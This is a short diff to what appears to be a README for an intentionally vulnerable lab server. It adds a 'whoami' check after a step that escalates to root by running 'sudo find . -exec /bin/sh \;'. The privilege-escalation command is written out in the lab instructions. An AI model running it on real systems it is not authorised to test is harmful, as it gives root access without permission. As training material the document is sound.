@@ -69,6 +69,7 @@ The server is pre-configured with a privilege escalation vulnerability:
 3. Exploit the `find` binary to gain **Root** access:
    ```bash
    sudo find . -exec /bin/sh \;
+   whoami # Should return 'root'
 ---
 
 ## 📂 Project Structure
